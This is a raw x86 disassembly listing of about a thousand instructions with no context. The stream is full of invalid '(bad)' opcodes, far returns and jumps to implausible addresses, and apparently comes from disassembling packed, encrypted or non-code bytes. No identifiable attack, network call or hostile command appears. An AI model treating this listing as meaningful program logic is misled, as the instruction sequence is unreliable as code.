  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
